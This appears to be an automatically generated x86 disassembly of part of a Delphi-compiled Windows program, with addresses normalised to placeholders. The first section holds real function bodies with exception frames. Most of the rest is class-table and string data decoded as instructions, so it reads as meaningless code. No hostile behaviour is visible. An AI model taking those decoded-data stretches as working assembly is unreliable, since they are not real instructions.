test al al
je r-xdata
mov eax [ esi + 0x14 ]
mov edx ebx
call sub_4246e8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_44b8f0
lea eax [ ebp - 0x8 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bff8
test al al
je r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x48 ]
jmp r-xdata
sub_420f38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421023
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ esi + 0x20 ]
mov edx ebx
call sub_449d2c
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42102a
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
inc eax
xor ebx ebx
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
mov eax [ esi + 0x14 ]
mov edx ebx
call sub_4246e8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_44b8f0
lea eax [ ebp - 0x8 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bff8
test al al
je r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x48 ]
jmp r-xdata
sub_421044
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_421110
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
xor edx edx
call sub_449d2c
mov eax [ esi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421117
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
inc eax
xor ebx ebx
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
jmp r-xdata
mov eax [ esi + 0x14 ]
mov edx ebx
call sub_4246e8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_44b8f0
lea eax [ ebp - 0x8 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bff8
test al al
je r-xdata
sub_421127
dec edx
xchg ecx eax
test al 0x4b
xchg ebp eax
xchg [ ebx - 0x74aa8758 ] edi
in al dx
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_4211f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4211f9
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
inc eax
xor ebx ebx
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
jmp r-xdata
mov eax [ esi + 0x14 ]
mov edx ebx
call sub_4246e8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_44b8f0
lea eax [ ebp - 0x8 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bff8
test al al
je r-xdata
sub_421130
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_4211f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4211f9
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
inc eax
xor ebx ebx
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
jmp r-xdata
mov eax [ esi + 0x14 ]
mov edx ebx
call sub_4246e8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_44b8f0
lea eax [ ebp - 0x8 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bff8
test al al
je r-xdata
sub_421228
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4246e8
cmp ebp [ eax + 0x8 ]
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4246e8
mov edi eax
cmp ebp [ edi + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4245dc
jmp r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4245dc
mov eax edi
call sub_4481b0
jmp r-xdata
sub_421298
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4212c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4212d0
retn
mov eax rw-data
call sub_44b8d8
sub_421520
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax * 2 + 0x65727453 ] cl
popad
insd
inc ebp
jb r-xdata
inc edx
jb r-xdata
outsd
jb r-xdata
jb r-xdata
outsd
jb r-xdata
nop
nop
je r-xdata
nop
nop
in al 0x15
nop
pop eax
push ss
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x16 ] ah
inc edx
add [ eax + eax ] bl
add [ eax ] al
mov [ 0xffffffff826c0042 ] ss
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ 0x72434645 ] cl
popad
je r-xdata
nop
enter 0x4216 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ esi ] 0x1
inc edx
add [ eax + eax ] bl
add [ eax ] al
mov [ 0xffffffff826c0042 ] ss
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
adc eax 0x1c0042
add [ eax ] al
sbb al 0x15
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax ] dl
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
nop
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx + 0x42 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
inc ebp
jb r-xdata
add [ ebx ] cl
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
outsb
inc ebp
jb r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx ] bh
inc edx
add [ eax + eax ] bl
add [ eax ] al
sbb al 0x15
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
pop ss
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004217 ] ch
add [ eax ] al
add ah bl
push ss
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x17
inc edx
add [ eax + eax ] bl
add [ eax ] al
fcom [ esi ]
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004218 ] al
add [ eax ] al
add ah bl
push ss
outsd
jb r-xdata
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
sahf
inc ebx
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
pop ss
jne r-xdata
dec esi
outsd
je r-xdata
jb r-xdata
or al 0x18
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx ] dl
jb r-xdata
nop
nop
nop
pop eax
sbb [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
sbb [ edx ] eax
sbb al 0x0
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
outsd
jne r-xdata
inc edx
add [ eax + eax ] bl
add [ eax ] al
fcom [ esi ]
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x18
jb r-xdata
outsd
inc ebx
insb
popad
jae r-xdata
je r-xdata
les ebx [ ecx ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
sbb [ edx ] eax
sbb al 0x0
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
xor [ edx ] bl
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
outsd
nop
inc ebp
push cs
inc ebp
jb r-xdata
outsd
insd
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
call sub_425aad
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
push dx
jae r-xdata
outsb
outsb
je r-xdata
jb r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
sbb [ edx ] al
sbb al 0x0
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ esi ] cl
sbb [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] 0x42
add [ eax + eax ] bl
add [ eax ] al
fcom [ esi ]
jo r-xdata
jne r-xdata
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax - 0x28 ] 0xd800439e
popfd
inc ebx
add ah ah
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edi ] cl
inc ebp
dec edi
jne r-xdata
jb r-xdata
jae r-xdata
jb r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
sbb al [ edx ]
sbb al 0x0
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax ] dl
inc ebp
push ebx
je r-xdata
nop
nop
movsb [ edi ] [ esi ]
sbb al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
sbb al [ edx ]
sbb al 0x0
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edi ] cl
inc ebp
inc ebx
dec ecx
inc edx
add ah al
inc ebp
inc edx
add [ esi + eax * 2 ] bh
jb r-xdata
imul ebp [ edi + 0x6e ] 0x1bf89090
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
sbb al 0x42
arpl [ ebp + 0x73 ] sp
dec edi
dec edi
test [ ebx ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx + 0x1c0042 ] cl
outsd
jo r-xdata
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ ecx ] dl
inc ebp
dec ecx
outsb
jbe r-xdata
sbb eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] ds
inc edx
add [ eax + eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx ] bl
inc edx
add [ eax ] ah
add [ eax ] al
add [ eax ] dl
cmp [ ebx ] eax
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
sbb eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x1b
add [ eax + eax ] dl
add [ eax ] al
loopne r-xdata
nop
clc
sbb eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx + eax * 2 ] bl
nop
push 0x421c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c ] ch
inc edx
add [ eax ] ch
add ah ah
je r-xdata
add [ eax ] al
add al ah
push esi
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + ecx * 2 ] bh
inc edx
add [ ebx ] cl
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x2800421c
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x45 ] dh
inc edx
add [ eax ] dl
inc edi
inc edx
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
inc edx
add [ 0x73694c54 ] al
je r-xdata
inc esi
outsd
outsb
nop
sub_421da2
inc edx
add [ ebx - 0x6affbde3 ] cl
sbb eax 0x10042
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
mov al [ 0x800421d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx ] ah
inc edx
add [ ebp + ebx + 0x42 ] ch
add [ eax ] al
xor al 0x1e
inc edx
add [ eax + 0x1e ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1e ] al
inc edx
add [ eax ] dl
add [ eax ] al
add ah dl
sbb al 0x42
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax ] bh
dec edi
inc edx
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebp + ecx * 2 + 0x4e900042 ] dl
inc edx
add [ eax - 0x3fffbdb2 ] bl
dec ebp
inc edx
add al cl
dec edi
inc edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x57 ] ah
inc esp
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
aam 0x1c
inc edx
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc edx
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add al al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0x2c004481
push ecx
imul esi [ ebx + 0x74 ] 0x60746e65
push ds
inc edx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ecx + edx * 2 ] ch
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
dec ebp
inc edx
add [ eax + 0x5c004251 ] bl
push edx
